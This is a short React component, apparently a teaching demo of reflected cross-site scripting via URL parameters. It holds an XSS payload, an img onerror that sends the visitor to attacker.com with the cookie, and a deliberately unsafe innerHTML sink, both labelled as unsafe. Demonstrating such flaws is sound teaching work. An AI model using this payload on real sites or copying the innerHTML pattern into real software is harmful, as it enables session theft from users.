import React, { useState } from 'react';

const UrlParamAttack = () => {

  const unsafeDisplayMessage = () => {
    // Extract the message from URL parameters
    //url : http://localhost:3000/?message=<img src="nonexistent.jpg" onerror="document.location='http://attacker.com?cookie=document.cookie'"></img>

    let message = `<img src="nonexistent.jpg" onerror="document.location='http://attacker.com?cookie=document.cookie'"></img>`

    // Get the current URL and use URLSearchParams to append the message
    const currentUrl = new URL(window.location.href); // Get the current URL
    currentUrl.searchParams.set('message', message); // Append or update the 'message' query parameter

    // Update the browser URL (without reloading the page)
    window.history.pushState({}, '', currentUrl.toString());

    const urlParams = new URLSearchParams(window.location.search);
    message = urlParams.get('message');
    console.log('message======', message);
    // Insert directly into the DOM using innerHTML (unsafe)
    const messageElement = document.getElementById('message');
    console.log('messageElement======', messageElement);

    if (messageElement) {
      messageElement.innerHTML = message; // This is unsafe and vulnerable to XSS
    }
  };


  return (
    <div>
      <h2>Url Parameter Attack</h2>
      <p>
        This example demonstrates how using url paramter with untrusted input can lead to security vulnerabilities like XSS attacks.
      </p>
      <button
        style={{ backgroundColor: 'red', color: 'white', marginBottom: '10px' }}
        onClick={unsafeDisplayMessage}
      >
        Display Unsafe Message
      </button>
      <div
        id="message"
        style={{
          border: '1px solid red',
          padding: '10px',
          color: 'red',
        }}
      >
        Unsafe message will display here...
      </div>
    </div>
  );
};

export default UrlParamAttack;
